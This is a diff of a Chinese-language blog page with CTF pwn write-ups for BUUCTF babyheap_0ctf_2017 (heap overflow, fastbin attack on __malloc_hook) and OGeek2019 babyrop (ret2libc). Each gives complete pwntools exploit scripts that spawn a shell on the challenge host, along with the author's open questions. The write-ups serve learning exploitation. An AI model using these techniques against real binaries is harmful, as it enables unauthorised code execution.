@@ -33,7 +33,7 @@
 <meta property="og:image" content="http://heygap.github.io/pic/Pasted%20image%2020230814144704.png">
 <meta property="og:image" content="http://heygap.github.io/pic/Pasted%20image%2020230814145721.png">
 <meta property="article:published_time" content="2023-08-14T05:22:00.000Z">
-<meta property="article:modified_time" content="2024-01-30T08:08:14.735Z">
+<meta property="article:modified_time" content="2024-02-06T00:30:10.306Z">
 <meta property="article:author" content="Gap">
 <meta property="article:tag" content="WriteUp">
 <meta name="twitter:card" content="summary">
@@ -224,7 +224,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-01-30 16:01:73" itemprop="dateModified" datetime="2024-01-30T16:08:14+08:00">2024-01-30</time>
+                <time title="修改时间：2024-02-06 08:02:30" itemprop="dateModified" datetime="2024-02-06T08:30:10+08:00">2024-02-06</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -261,9 +261,9 @@
 <blockquote class="blockquote-center">
 第一道Heap，插个里程碑纪念一下XD
 </blockquote>
-<h2 id="x01-buuctf-babyheap_0ctf_2017">0x01 BUUCTF
-babyheap_0ctf_2017</h2>
-<h3 id="x00-写在前面">0x00 写在前面</h3>
+<h1 id="x01-buuctf-babyheap_0ctf_2017">0x01 BUUCTF
+babyheap_0ctf_2017</h1>
+<h2 id="写在前面">0. 写在前面</h2>
 <p>七月学完栈溢出，ak掉buu前两页的所有栈题<br />
 八月本来是想把堆学穿，等回想起这个目标前半个月已经没了<br />
 参加了个数据安全的夏令营<br />
@@ -274,14 +274,19 @@ babyheap_0ctf_2017</h2>
 本来栈的能力就没得到比赛的检验，堆的学习时间又所剩无几了...<br />
 总而言之还是脚踏实地学一点算一点吧<br />
 还有个南大PA的坑等着我去填呢...才刚把nemu的gdb实现了个单步步入...</p>
-<hr />
 <blockquote>
-<p>做完这道题才算真正意义上的AK第一页XD ### Ⅰ. 主要知识点 1. 堆溢出</p>
+<p>做完这道题才算真正意义上的AK第一页XD</p>
 </blockquote>
-<h3 id="解题步骤">Ⅱ. 解题步骤</h3>
+<h2 id="主要知识点">Ⅰ. 主要知识点</h2>
 <ol type="1">
-<li><p>checksec 保护全开<br />
-<img src="/pic/Pasted%20image%2020230814133847.png" /></p></li>
+<li>堆溢出</li>
+</ol>
+<h2 id="解题步骤">Ⅱ. 解题步骤</h2>
+<ol type="1">
+<li>checksec 保护全开</li>
+</ol>
+<p><img src="/pic/Pasted%20image%2020230814133847.png" /></p>
+<ol start="2" type="1">
 <li><p>该elf文件在ubuntu16中创建，wsl用的本机libc肯定不合适，所以<code>patchelf</code>一下<br />
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure></p></li>
 <li><p>拖进IDA64分析，让反汇编以后的代码好看一点<br />
@@ -343,19 +348,75 @@ flag <figure class="highlight python"><table><tr><td class="gutter"><pre><span c
 </ol>
 <h3 id="完整exp">Ⅲ. 完整EXP</h3>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">domain_name = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25970</span></span><br><span class="line">file = <span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># io = remote(domain_name,port)</span></span><br><span class="line">io = process(file)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.recvline()</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">payload = (p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>))*<span class="number">2</span> + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">  </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">16</span>)[-<span class="number">8</span>:])-<span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base   ---&gt;   &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">  </span><br><span class="line">gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span> + p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">255</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="一些疑问">Ⅳ. 一些疑问</h3>
+<h2 id="一些疑问">Ⅳ. 一些疑问</h2>
 <ol type="1">
-<li>__malloc_hook不是在data段中吗？这题开了FULL
-RELRO为什么可以改啊🤔</li>
-<li>第九步中heap中chunk2的Addr为什么还是40而不是80啊？</li>
-<li>第十步为什么chunk4会跟topchunk合并？是哪个bin的机制？
+<li><p>__malloc_hook不是在data段中吗？这题开了FULL
+RELRO为什么可以改啊🤔</p></li>
+<li><p>第九步中heap中chunk2的Addr为什么还是40而不是80啊？</p></li>
+<li><p>第十步为什么chunk4会跟topchunk合并？是哪个bin的机制？</p>
 <ol type="1">
 <li>unsortedbin，后向合并</li>
 </ol></li>
-<li><strong><em>为什么非要在aed处申请堆块？</em></strong>
+<li><p><strong><em>为什么非要在aed处申请堆块？</em></strong></p>
 <ol type="1">
 <li>fastbin指针指向0xaed，说明0xaed-8是size，0xaed-0x10是prev_size，正好伪装chunk</li>
 </ol></li>
+</ol>
+<h1 id="buuctf-pwn-ogeek2019babyrop_wp">buuctf pwn
+[OGeek2019]babyrop_wp</h1>
+<blockquote>
+<p>网上很多wp已经不适用了，所以来更新一波XD</p>
+</blockquote>
+<h2 id="x00-知识点">0x00 知识点</h2>
+<ol type="1">
+<li>ret2libc</li>
+<li>提供libc的打法</li>
+<li>绕过strlen &amp; strncmp函数</li>
+</ol>
+<h2 id="x01-解题步骤">0x01 解题步骤</h2>
+<blockquote>
+<p>不贴图了，按伪代码顺序来</p>
+</blockquote>
+<ol type="1">
+<li>fd是urandom库生成的随机数</li>
+<li>将fd读4位进buf</li>
+<li>将buf作为参数传进函数A，在A中称作a1</li>
+<li>将a1读进s</li>
+<li><strong>用户输入buf</strong>，但限制读入长度0x20，无法溢出；但可以考虑泄露</li>
+<li>v1赋值为buf的长度，绕过strlen &amp; strncmp函数可以用'\x00'</li>
+<li>返回buf[7]，传入函数B，在B中称作a1，是read的检测长度，如果足够长可以构造溢出
+于是函数A中的read我们有思路了，即 1. 绕过strlen 2. 返回buf[7]越大越好
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line"></span><br><span class="line">io.sendline(payload)                              # Q1：为什么非得是sendline而不能是send？</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br></pre></td></tr></table></figure></li>
+<li>B中观察栈的结构可知，我们可以用0xE7+4的垃圾数据抵达返回地址</li>
+<li>由于string中并没有找到system('/bin/sh')，而题目提供了libc，所以我们可以泄露libc基地址；由于函数B结束后程序即将结束，我们已经没有溢出的点了，所以考虑将main作为返回地址，再来提供一次溢出，所以考虑构造payload2：
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">xxxxxx</span><br><span class="line">xxxxxx&lt;-----垃圾数据</span><br><span class="line">puts_plt&lt;---调用puts</span><br><span class="line">main_addr&lt;--将puts的返回地址压栈，即将eip的下一条指令压栈</span><br><span class="line">puts_got&lt;---将puts的参数弹给puts</span><br><span class="line"></span><br><span class="line">junk     =  0xE7 + 4</span><br><span class="line"></span><br><span class="line"># payload  =  b&#x27;a&#x27;*junk + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)</span><br><span class="line"></span><br><span class="line">payload  =  b&#x27;a&#x27;*junk + p32(puts_plt) + p32(main_addr) + p32(puts_got)      # Q2: puts为什么不会打印后面的内容了？为什么puts_got后面一定是可以被转换为0a的00？</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr =  u32(io.recv(4))</span><br><span class="line"></span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"></span><br><span class="line"># 注1：puts(const char* arg1)一直打印，直到遇到&#x27;\0&#x27;，丢弃&#x27;\0&#x27;并输出&#x27;\n&#x27;</span><br><span class="line"># 注2：sszie_t write(fd,const char* src,length) (fd=1,length=32/8 or 64/8)</span><br></pre></td></tr></table></figure></li>
+<li>泄露libc地址后，泄露<code>system</code>和<code>/bin/sh</code>的地址
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">offset   = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">sys_addr = offset + libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">bin_sh   = offset + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br></pre></td></tr></table></figure></li>
+<li>再进行一次绕过strncmp <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br></pre></td></tr></table></figure></li>
+<li>最后提权 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload  =  b&#x27;a&#x27;* junk + p32(sys_addr) + p32(0) + p32(bin_sh)    # 细节2：覆盖返回地址时，32位需要在栈上补充返回地址</span><br><span class="line">                                                                 # Q3：为什么？</span><br><span class="line">io.send(payload)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
+<li>最后贴一下全部exp <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;,26218)</span><br><span class="line"></span><br><span class="line"># context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">libc = ELF(&#x27;libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">puts_got =elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">puts_plt =elf.plt[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">main_addr = 0x08048825</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">junk     =  0xE7 + 4</span><br><span class="line"></span><br><span class="line">payload  =  b&#x27;a&#x27;*junk + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">puts_addr =  u32(io.recv(4))</span><br><span class="line"></span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">offset   = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">sys_addr = offset + libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">bin_sh   = offset + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload  =  b&#x27;a&#x27;* junk + p32(sys_addr) + p32(0) + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="x02-一些思考">0x02 一些思考</h2>
+<ol type="1">
+<li>本题还可以有以下几种打法
+<ol type="1">
+<li>泄露地址方面：不仅可以用puts，还可以用write；讲道理一切能输出到终端的函数都可以利用来泄露内容，后续慢慢探索</li>
+<li>泄露地址后，我们可以用og进行提权</li>
+</ol></li>
+<li>一些工具的使用
+<ol type="1">
+<li>flat可以用来构造payload</li>
+</ol></li>
+</ol>
+<h2 id="x03-一些问题">0x03 一些问题</h2>
+<ol type="1">
+<li>0x01
+中第七步payload，为什么在send时只能是sendline，我看received的结果明明都一样啊</li>
+<li>0x01
+中第九步payload，puts为什么不会打印后面的内容了（代码底部'注2'）？为什么puts_got后面一定是可以被转换为0a的00？</li>
+<li>0x01 中第12步payload，为什么需要sys_addr + 0 +
+bin_sh，这个0是sys_addr的返回地址吗？</li>
+<li>网上很多博客都用LibcSearcher，可是我在将LibcSearcher数据库更新到最新版本以后还是无法查到对应libc库，很奇怪</li>
 </ol>
 
     </div>
@@ -467,8 +528,9 @@ RELRO为什么可以改啊🤔</li>
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#x01-buuctf-babyheap_0ctf_2017"><span class="nav-number">1.</span> <span class="nav-text">0x01 BUUCTF
-babyheap_0ctf_2017</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#x00-%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 写在前面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.2.</span> <span class="nav-text">Ⅱ. 解题步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="nav-number">1.3.</span> <span class="nav-text">Ⅲ. 完整EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E7%96%91%E9%97%AE"><span class="nav-number">1.4.</span> <span class="nav-text">Ⅳ. 一些疑问</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#x01-buuctf-babyheap_0ctf_2017"><span class="nav-number">1.</span> <span class="nav-text">0x01 BUUCTF
+babyheap_0ctf_2017</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.1.</span> <span class="nav-text">0. 写在前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">1.2.</span> <span class="nav-text">Ⅰ. 主要知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.3.</span> <span class="nav-text">Ⅱ. 解题步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="nav-number">1.3.1.</span> <span class="nav-text">Ⅲ. 完整EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E7%96%91%E9%97%AE"><span class="nav-number">1.4.</span> <span class="nav-text">Ⅳ. 一些疑问</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-pwn-ogeek2019babyrop_wp"><span class="nav-number">2.</span> <span class="nav-text">buuctf pwn
+[OGeek2019]babyrop_wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#x00-%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">2.1.</span> <span class="nav-text">0x00 知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x01-%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="nav-number">2.2.</span> <span class="nav-text">0x01 解题步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x02-%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83"><span class="nav-number">2.3.</span> <span class="nav-text">0x02 一些思考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x03-%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98"><span class="nav-number">2.4.</span> <span class="nav-text">0x03 一些问题</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -484,7 +546,7 @@ babyheap_0ctf_2017</span></a><ol class="nav-child"><li class="nav-item nav-level
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -495,7 +557,7 @@ babyheap_0ctf_2017</span></a><ol class="nav-child"><li class="nav-item nav-level
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
